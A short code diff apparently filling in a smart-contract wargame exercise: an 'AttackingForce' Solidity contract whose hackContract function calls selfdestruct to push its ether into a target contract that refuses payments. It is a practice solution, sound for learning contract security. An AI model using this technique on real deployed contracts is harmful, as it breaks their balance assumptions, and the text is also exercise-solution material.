@@ -11,5 +11,8 @@ contract AttackingForce {
 
     function hackContract() external {
         // Code me!
+        // cast victim address as payable
+        // selfdestruct this contract and send all ether to victim
+        selfdestruct(payable(contractAddress));
     }
 }
